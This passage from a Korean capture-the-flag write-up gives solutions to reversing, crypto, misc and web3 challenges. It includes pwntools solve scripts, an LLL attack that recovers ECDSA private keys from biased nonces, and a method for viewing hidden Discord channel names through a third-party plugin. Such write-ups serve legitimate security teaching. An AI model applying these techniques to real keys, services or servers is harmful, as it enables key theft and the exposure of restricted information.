**note:** Nginx 파일을 참고하면, /api/ 에 backend로 리버스 프록시, 나머지는 frontend로 리버스 프록시 하기때문에, 실제로 엔드포인트는 `/api/{ENDPOINT_HERE}`가 됩니다.

## 7. Reversing - waving

원본 오디오 데이터를 복구하고, 복구된 오디오를 재생하여 플래그를 획득하면 되는 문제입니다.

바이너리를 확인해보면, 16비트 정수의 비트를 반전시키는 함수가 존재하는데, 입력값 n의 비트 순서를 거꾸로 하여 반환합니다.

과정은 다음과 같습니다. 데이터 영역의 16비트씩 엔디안 변환, 비트 반전, 엔디안 변환을 수행합니다. 데이터 영역이 암호화된 wav파일을 16비트씩 비트 역 연산을 수행해주면 됩니다.

마지막으로 wav 파일을 다시 들으면 정상적인 플래그를 획득할 수 있습니다. 다만, 녹음 속도가 빠르기 때문에 풀이자는 wav파일의 sample rates를 변경하여 음성을 들으면 플래그를 확인할 수 있습니다.

```c
int __fastcall sub_11F0(char *a1, char *a2)
{
  unsigned __int16 v2; // ax
  unsigned __int16 v4; // [rsp+Eh] [rbp-52h] BYREF
  char ptr[48]; // [rsp+10h] [rbp-50h] BYREF
  FILE *s; // [rsp+40h] [rbp-20h]
  FILE *stream; // [rsp+48h] [rbp-18h]
  char *v8; // [rsp+50h] [rbp-10h]
  char *filename; // [rsp+58h] [rbp-8h]

  filename = a1;
  v8 = a2;
  stream = fopen(a1, "rb");
  s = fopen(a2, "wb");
  if ( !stream )
  {
    printf("Error!\n");
    exit(1);
  }
  if ( !s )
  {
    printf("Error@\n");
    exit(1);
  }
  fread(ptr, 0x2CuLL, 1uLL, stream);
  fwrite(ptr, 0x2CuLL, 1uLL, s);
  while ( fread(&v4, 2uLL, 1uLL, stream) == 1 )
  {
    v4 = (v4 << 8) | ((int)v4 >> 8);
    v2 = sub_1190(v4);
    v4 = (v2 << 8) | ((int)v2 >> 8);
    fwrite(&v4, 2uLL, 1uLL, s);
  }
  fclose(stream);
  return fclose(s);
}

__int64 __fastcall sub_1190(unsigned __int16 a1)
{
  int i; // [rsp+0h] [rbp-8h]
  unsigned __int16 v3; // [rsp+4h] [rbp-4h]

  v3 = 0;
  for ( i = 0; i < 16; ++i )
  {
    v3 = a1 & 1 | (2 * v3);
    a1 = (int)a1 >> 1;
  }
  return v3;
}
```

## 8. Reversing - OptimizeMe

피보나치 수열은 행렬의 거듭제곱 형태로 표현할 수 있으며, 분할 정복을 이용한 행렬 거듭제곱 알고리즘을 적용하면 n번째 피보나치 수열 값을 O(M³ log N)의 시간복잡도로 계산할 수 있습니다.

주어진 바이너리에서는 확장된 피보나치 수열의 값을 분할 정복 없이 단순 반복(Naive) 방식으로 계산하기 때문에 O(M × N)의 시간복잡도를 가지게 됩니다.

계산해야 하는 피보나치 항의 번호가 두 배씩 증가하기 때문에 바이너리를 직접 실행하고 결과를 기다리는 방식으로는 flag 전체 값을 구하는 것이 매우 어렵습니다.

따라서 바이너리를 분석하여 확장된 피보나치 수열의 각 항을 파악한 후, 분할 정복 기반의 행렬 거듭제곱 알고리즘을 이용해 효율적으로 최적화하여 flag 값을 도출할 수 있습니다.

## 9. Reversing - classic-is-the-best

이 문제는 총 100개의 stage로 구성된 자동화된 리버싱(auto reversing) 챌린지로, 제공되는 정보는 서버 주소뿐입니다. 1~50번째 stage에서는 add, sub, xor, div 네 가지 연산자를 이용해 간단한 연산을 수행하는 바이너리가 tar.gz 형태로 제공됩니다. 이 압축 파일을 해제하여 ELF 파일을 분석하고 각 연산자의 패턴을 파악하면, 각 바이너리의 답을 자동으로 찾아내는 프로세스를 구현할 수 있습니다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

#define VALUE REPLACE_VALUE
#define ANSWER REPLACE_ANSWER
#define OPERATOR REPLACE_OPERATOR

unsigned int VAL = VALUE;
unsigned int ANS = ANSWER;

bool checker(unsigned int num) 
{
    bool res = false;
    if( (VAL OPERATOR num) == ANS) res = true;
    return res;
}

int main (int argc, const char *argv[]) 
{
    unsigned int x = strtoul(argv[1], NULL, 10);

    if(checker(x)) {
        return 0;
    } else {
        return 1;
    }
}
```
위 코드가 1 ~ 50stage에서 사용되는 템플릿 코드입니다. ELF의 전역변수에서 `VAL`, `ANS`의 값을 쉽게 가져올 수 있고, `checker`함수의 주소를 disassemble하면 어떤 연산을 진행하고 있는지 파악할 수 있습니다.

51 ~ 100stage에서는 내 입력과 전역변수에 주어져 있는 데이터 배열을 서로 xor하여 전역변수에 등록된 또 다른 변수와 값을 비교한뒤 값이 일치하면 다음 stage로 넘어갑니다.

마찬가지로, tar.gz를 압축 해제하고 패턴을 파악하여 랜덤화되는 데이터 길이, 값을 구하면 단순히 전역변수 두 개를 서로 xor하여 우리가 입력해야할 input을 구해낼 수 있습니다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

#define VALUE REPLACE_VALUE

#define ANSWER REPLACE_ANSWER

#define LEN REPLACE_LEN

const char *ANS = ANSWER;
const char *VAL = VALUE;
char RES[LEN];

void encoding(const char *buf) {
    for(int i = 0; i < LEN; ++i)
        RES[i] = buf[i] ^ VAL[i];
}

bool checker(const char *buf) 
{
    bool res = false;
    encoding(buf);
    if(memcmp(RES, ANS, LEN) == 0) res = true;
    return res;
}

int main (int argc, const char *argv[]) 
{
    if(checker(argv[1])) {
        return 0;
    } else {
        return 1;
    }
}
```
위 코드가 51 ~ 100stage에서 사용되는 템플릿인데, `LEN` 값의 경우에는 `checker`함수를 disassemble하여 `memcmp`의 인자를 확인하면 구할 수 있고, 나머지 두 개의 data는 이전과 마찬가지로 전역변수를 읽어오면 쉽게 값을 구해낼 수 있습니다.

아래는 풀이 script입니다.
```py
from pwn import *
import io
import tarfile
import base64

def extract_tar_gz_bytes(tar_bytes: bytes):
    tar_stream = io.BytesIO(tar_bytes)
    with tarfile.open(fileobj=tar_stream, mode="r:gz") as tar:
        for member in tar.getmembers():
            buf = tar.extractfile(member).read()
    with open("./prob", 'wb') as f:
        f.write(buf)

def get_answer1() -> int:
    e = ELF('./prob')
    data = u32(e.read(0x4030, 4))
    answer = u32(e.read(0x4034, 4))
    code = e.disasm(0x1135, 0x100).split('\n')[5:]
    if 'add' in code[1]:
        go = answer - data
    elif 'sub' in code[0]:
        go = data - answer
    elif 'xor' in code[0]:
        go = answer ^ data
    else:
        go = data // answer

    go &= 0xffffffff
    return go

def get_answer2() -> bytes:
    e = ELF('./prob')
    code = e.disasm(0x11AC, 5)
    length = int(code[code.find('0x'):], 16)
    correct = e.read(u64(e.read(0x4030, 8)), length) 
    encoding = e.read(u64(e.read(0x4038, 8)), length)
    res = b''
    for i in range(length):
        res += (correct[i] ^ encoding[i]).to_bytes(1, 'little')
    return res

def main():
    # p = process(['python3', './prob.py'])
    p = remote('0', 59595)
    for stage in range(1, 51):
        p.recvline()
        tar = base64.b64decode(p.recvline()[:-1])    
        extract_tar_gz_bytes(tar)
        go = get_answer1()
        p.sendlineafter(b'x: ', str(go).encode())
        log.success(f'STAGE {stage} cleared')

    for stage in range(51, 101):
        p.recvline()
        buf = p.recvline()[:-1]
        tar = base64.b64decode(buf)    
        extract_tar_gz_bytes(tar)
        go = get_answer2().hex()
        p.sendlineafter(b'y (hex encoded): ', go)
        log.success(f'STAGE {stage} cleared')
    p.interactive()

if __name__ == '__main__':
    main()
```

아래는 문제 script파일입니다.
```py
import subprocess
import random
import time
import os
import shutil 
import base64
import io
import tarfile
import string

OPERATORS = ["+", "-", "/", "^"]

NOW = int(time.time() * 100)

PATH = f'./tmp/{str(NOW)}'


def make_dir():
    dirs = os.listdir('./tmp/')
    for d in dirs:
        if int(d) + 12000 <= NOW:
            shutil.rmtree(f'./tmp/{d}')
    os.mkdir(PATH)

def get_tar_gz_bytes(source_dir):
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        tar.add(source_dir, arcname="prob")
    tar_stream.seek(0)
    tar_bytes = tar_stream.getvalue()
    
    return tar_bytes

def compile1():
    oper = random.randint(0, 3)
    v1 = random.randint(0x4fffffff, 0xffffffff)
    v2 = random.randint(0xfffffff, 0x1fffffff)
    answer = {'value':0}
    exec(f'answer["value"] = ( int(v1 {OPERATORS[oper]} v2) & 0xffffffff)')

    with open('./1-50.c', 'r') as f:
        code = f.read()
    code = code.replace('REPLACE_VALUE', hex(v1))
    code = code.replace('REPLACE_OPERATOR', OPERATORS[oper])
    code = code.replace('REPLACE_ANSWER', hex(answer['value']))

    with open(f'{PATH}/tmp.c', 'w') as f:
        f.write(code)

    subprocess.run(['gcc', '-o', f'{PATH}/tmp', f'{PATH}/tmp.c', '-s'], stderr=subprocess.DEVNULL)
    print(base64.b64encode(get_tar_gz_bytes(f"{PATH}/tmp")).decode())
    
def compile2():
    r_len = random.randint(1, 8) * 0x10
    v1 = answer = b''

    for i in range(r_len):
        v1 += random.randint(0, 0xff).to_bytes(1, 'little')
        answer += random.randint(0, 0xff).to_bytes(1, 'little')
        while v1[i] == answer[i]:
            v1 = bytearray(v1)
            v1[i] = random.randint(0, 0xff)
            v1 = bytes(v1)

    with open('./51-100.c', 'r') as f:
        code = f.read()

    v1 = ''.join(f'\\x{byte:02x}' for byte in v1)
    answer = ''.join(f'\\x{byte:02x}' for byte in answer)

    code = code.replace('REPLACE_VALUE', f'"{v1}"')
    code = code.replace('REPLACE_ANSWER', f'"{answer}"')
    code = code.replace('REPLACE_LEN', hex(r_len))

    with open(f'{PATH}/tmp.c', 'w') as f:
        f.write(code)

    subprocess.run(['gcc', '-o', f'{PATH}/tmp', f'{PATH}/tmp.c', '-s'])
    print(base64.b64encode(get_tar_gz_bytes(f"{PATH}/tmp")).decode())

def check(go: str):
    res = subprocess.run([f'{PATH}/tmp', go])
    if res.returncode != 0:
        print("WRONG!!!!")
        exit(0)

def main():
    make_dir()
    for stage in range(1, 51):
        print(f"=== STAGE {stage} ===")
        compile1()
        go = input('x: ')
        check(go)

    for stage in range(51, 101):
        print(f"=== STAGE {stage} ===")
        compile2()
        go = bytes.fromhex(input('y (hex encoded): '))
        check(go)

    print("Congratulations!")
    with open('./flag.txt', 'r') as f:
        print(f.read())

if __name__ == '__main__':
    main()
``` 

## 10. Crypto - mnnm

chall.py
```python
from Crypto.Util.number import *

flag = "hspace{}"
m = bytes_to_long(flag.encode())

while True:
    n = int(input("n = "))
    print(pow(m, n, n) == m)
```

어떤 값 `m`에 대하여 `pow(m, n, n) == m`을 만족할 조건을 살펴보아야 합니다. 

`n`이 소수인 경우, 페르마의 소정리에 따라서, `m`이 `n`의 배수가 아니라면, `pow(m, n - 1, n) == 1`을 만족합니다. 따라서 `pow(m, n, n) == 1 * m = m` 또한 만족합니다. 

여기서 유의할 점은, `m`이 `n`보다 클 경우, 연산의 결과는 `m`이 아닌, `m % n`이 나온다는 사실입니다. 따라서, 소수 `n`만을 입력으로 주었을 때, 결과가 False라면, `m`이 `n` 이상임을 알 수 있고, True라면 `n`보다 작음을 알 수 있습니다. 큰 소수 `n`을 초깃값으로 설정한 후, 이분 탐색을 수행하면, 마지막 두 바이트를 제외한 플래그를 얻을 수 있습니다. 

실제 `m`은 약 480비트로, 연속한 소수간의 평균 간격은 480정도 입니다. 이 정확도로는 안전하게 두 바이트 전의 플래그를 복구할 수 있습니다. 마지막 바이트는 `b'}'`라는 사실과, 플래그에 존재하는 단어가 말이 되게 조합하면 충분히 플래그를 구할 수 있습니다. 

풀이 코드는 다음과 같습니다.

ex.py
```python
from pwn import *
from Crypto.Util.number import *

io = remote("localhost", 1729)

def get(n):
    io.sendlineafter(b"n = ", str(n).encode())
    res = io.recvline().decode()
    return res[0] == "T"

n = getPrime(500)

assert get(n)

upper_bound = n - 1
lower_bound = 0

while True:
    mid = (upper_bound + lower_bound) // 2
    mid |= 1
    while not isPrime(mid):
        mid += 2

    res = get(mid)

    if res:
        upper_bound = mid - 1
    else:
        lower_bound = mid

    diff = (upper_bound - lower_bound).bit_length()

    f1 = long_to_bytes(lower_bound)
    f2 = long_to_bytes(upper_bound)

    safe_len = 0
    for i in range(len(f1)):
        if f1[i] == f2[i]:
            safe_len += 1
        else:
            break

    flag = f1[:safe_len] + b"?" * (len(f1) - safe_len)

    print(flag.decode(), diff)
```

위 코드를 실행했을 때의 결과는 다음과 같습니다.

```
...
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_al??? 20
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_al??? 19
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_al??? 18
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_al??? 17
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_al??? 16
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_als?? 15
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_als?? 14
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_als?? 13
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_als?? 12
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_als?? 11
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_als?? 11
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_als?? 10
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_als?? 10
hspace{Fermat_mini_theorem_is_perfect_oh_b1nary_search_als?? 10
...
```

10비트의 오차에서 더 줄이는 것은 불가능하고, 마지막 부분이 `b"als0}"`임을 쉽게 추측할 수 있습니다.

## 11. Crypto - HalfHalf

```python
# https://eprint.iacr.org/2023/841.pdf
import json
import signal
import sys
from hashlib import sha256
from secrets import token_bytes
from typing import Any, Dict

from ecdsa import SECP256k1, SigningKey

from flag import flag

l = 128
MASK = (1 << l) - 1


def send_msg(data: Dict):
    sys.stdout.write(json.dumps(data) + "\n")
    sys.stdout.flush()


def recv_msg() -> Dict[str, Any]:
    data = sys.stdin.readline().strip()
    return json.loads(data)


def main():
    trials = 100
    correct = 0
    for _ in range(trials):
        sk = SigningKey.generate(curve=SECP256k1, hashfunc=sha256)
        pk = sk.privkey.secret_multiplier
        pubkey = sk.get_verifying_key().pubkey
        send_msg({"x": int(pubkey.point.x()), "y": int(pubkey.point.y())})

        msg = token_bytes(32)
        h = int.from_bytes(sha256(msg).digest(), byteorder="big")
        k = ((pk & MASK) << l) | (h & MASK)
        sig = sk.sign(msg, k=k)
        send_msg({"msg": msg.hex(), "sig": sig.hex()})

        pk_ = recv_msg()["pk"]
        if pk_ == pk:
            correct += 1

    assert correct / trials >= 0.75
    send_msg({"flag": flag})


if __name__ == "__main__":
    signal.alarm(60)
    main()
```

논문 [The curious case of the half-half Bitcoin ECDSA nonces](https://eprint.iacr.org/2023/841.pdf) 의 3.2절을 변형하는 문제입니다. ECDSA에서 사용되는 nonce `k`를 암호학적 난수로 사용하지 않았을때 발생하는 개인키 복구 공격 방식을 다룹니다. 기존 논문에서는 nonce `k`를 다음과 같이 생성하였을때 개인키 복구 공격을 다룹니다:
- Original: `k = ((h >> l) << l) | (d >> l))`

이 문제에서는 아래와 같이 nonce `k`를 변형합니다:
- This chall: `k = ((d & MASK) << l) | (h & MASK)`

기존 논문과 이 문제는 동일하게 LLL 알고리즘을 통하여 Hidden Number Problem(HNP)을 푸는 것으로 환원됩니다.

문제에서는 총 100개의 개인키 복구 시도 중 최소 75개의 공격이 성공하여야 합니다. 논문의 3.2절에서 언급되는 recentering을 활용하여, 75% 이상의 정확도를 이끌어낼 수 있습니다:

다음은 서명과 평문, 공개키를 바탕으로, HNP를 푸는 구현입니다.

```python
def attack(r, s, m, pubkey):
    h = int.from_bytes(sha256(m).digest(), byteorder="big")
    h_msb = h >> l
    h_lsb = h & ((2**l) - 1)
    assert h == (h_msb << l) + h_lsb

    t = 1 - s * pow(r, -1, n) * 2**l
    A = (pow(t, -1, n) * 2**l) % n

    b = (h - s * h_lsb) * pow(r, -1, n)
    b += 2 ** (l - 1) * t
    b += 2**l * 2 ** (l - 1)
    b *= pow(t, -1, n)
    b %= n

    B = matrix(ZZ, [[n, 0, 0], [A, 1, 0], [b, 0, 2 ** (l - 1)]])
    L = B.LLL()

    for row in L:
        for target in [(-1, -1), (-1, 1), (1, -1), (1, 1)]:
            d_lsb_cand = target[0] * row[0] + (2 ** (l - 1))
            d_msb_cand = target[1] * row[1] + (2 ** (l - 1))
            d_cand = (d_msb_cand << l) + d_lsb_cand
            if pubkey != d_cand * G:
                continue
            return d_cand
    return 0

# hspace{Always_see_the_entropy_as_half_full_51bdb3b0}
```

## 12. Crypto - zkLabyrinth

chall.py
```python
from PIL import Image
from hashlib import sha256
from secret import flag

side_real = 100
side = side_real * 2 + 1

m = list(Image.open('maze.png').getdata())
m = [int(block == (0, 0, 0, 255)) for block in m]
assert len(m) == side**2
m = [m[side * i:side * (i + 1)] for i in range(side)]
assert m[1][0] == 0 and m[-2][-1] == 0

p = 2**255 - 19

def str2fp(msg):
	return int.from_bytes(sha256(msg.encode()).digest()) % p

name = input("Your name: ")
key = input("Your key: ")

state = str2fp(name)

x, y = 0, 1

while (x, y) != (side - 1, side - 2):
	cmd = input("> ")

	for c in cmd.lower():
		if c == "w":
			y -= 1
			state *= pow(1337, -1, p)
		elif c == "a":
			x -= 1
			state -= 1337
		elif c == "s":
			y += 1
			state *= 1337
		elif c == "d":
			x += 1
			state += 1337
		state %= p

		try:
			assert m[y][x] == 0			
		except:
			print("Invalid move!")
			exit()

if state == str2fp(key):
	print("Are you an alchemist?", flag)
else:
	print("You beat the maze, congrats!!! 🎉")
```

미로가 구현되어 있고, 상하좌우에 따라 $\mathbb{F}_p$ 위에서 1337에 대한 사칙연산을 수행합니다.

왼쪽-오른쪽이 서로 역연산, 위-아래가 서로 역연산 이기 때문에 미로가 일반적인 트리 자료구조라면 경로에 상관없이 도착점에서의 `state`는 온전히 시작점에서의 `state`에만 의존합니다. 그러나 시작과 최종 `state`는 sha256 해시값으로 결정되기 때문에 설정이 어렵습니다.

미로 `maze.png`를 분석해보면 실제로 트리 구조가 아님을 알 수 있습니다. 다시 말해, cycle이 존재합니다. Cycle이 존재한다면 cycle을 1회 돌 때마다 같은 위치로 다시 되돌아오더라도 state에 변화가 일어납니다. 
계산을 해보면 한 cycle을 순회하면 일정한 값이 `state`에 더해짐을 알 수 있습니다.

DFS로 그래프 분석을 진행하면 30개의 cycle이 존재함을 알 수 있고, LLL 알고리즘을 통해 각 사이클을 8비트 가량의 횟수만큼 반복해 돔으로서 최종 `state`를 원하는 값으로 바꿀 수 있습니다.

## 13. Misc - hijacking


5초의 제한 시간 안에 버튼 30번을 클릭해야하는 문제입니다.  버튼의 위치가 계속 바뀌기 때문에 손으로 이를 해결하는 것은 불가능에 가깝습니다.
브라우저에 내장된 console을 활용하여 이를 빠르게 클릭해주면 플래그를 획득할 수 있다.

```js
let clickInterval = setInterval(() => {
    document.getElementById('moving-button').click();
}, 10);

setTimeout(() => {
    clearInterval(clickInterval);
}, 5000);
```

## 14. Misc - discord-check


디스코드에서 어떤 서버든, 권한에 상관없이 API를 통해 보기 권한이 없는 채널도 채널 제목/설명/권한 등은 확인할 수 있다는 사실은 알려진 사실이라면 알려진 사실이나, 모르는 사람들도 꽤 존재합니다.

https://betterdiscord.app/ 를 설치한 뒤

https://github.com/JustOptimize/ShowHiddenChannels/blob/main/ShowHiddenChannels.plugin.js 플러그인을 실행하고 HSPACE 디스코드를 들어오면 온 채널명을 확인 가능합니다.
- hex-flag-6873706163657b746869735f69735f616e5f6f6c645f6275673f3f3f5f6f665f646973636f72642121217d

해당 hex 값을 아스키로 변경하면 플래그임을 확인할 수 있습니다.


## 15. Misc - CrackMe

CPython에서는 int를 str로 변환할 때 글자 수에 제한이 걸려 있습니다. (Ref. https://docs.python.org/ko/3/library/stdtypes.html#int-max-str-digits)

이를 이용해 number + salt가 10의 4300승을 넘는지 아닌지를 에러 메시지를 통해 판단할 수 있습니다.

이진 탐색으로 salt를 알아낼 수 있습니다.

## 16. Web3 - space-miner

먼저, blockscout 등의 도구로 배포된 컨트랙트의 주소를 확인합니다.

이후, 디컴파일을 해보면 다음과 같은 로직을 확인할 수 있습니다.

```js
function customMine(uint256 nonce) public nonReentrant {
// require(!usedNonces[msg.sender][nonce], "Nonce already used");
// usedNonces[msg.sender][nonce] = true;

console.log("msg.sender: %s, nonce: %s, custom_hash: %s", msg.sender, nonce, custom_hash);

bytes32 digest = keccak256(abi.encodePacked(msg.sender, nonce, custom_hash));
console.log("digest: %s", uint256(digest));
require(uint256(digest) < difficulty, "Mining difficulty not reached");

custom_hash = uint256(digest);

_mint(msg.sender, reward);
}
```

custom_hash는 public 변수이기 때문에, nonce와 custom_hash를 적절히 이용해 keccak256 hash를 생성하여 difficulty를 통과하면 코인을 획득할 수 있습니다.
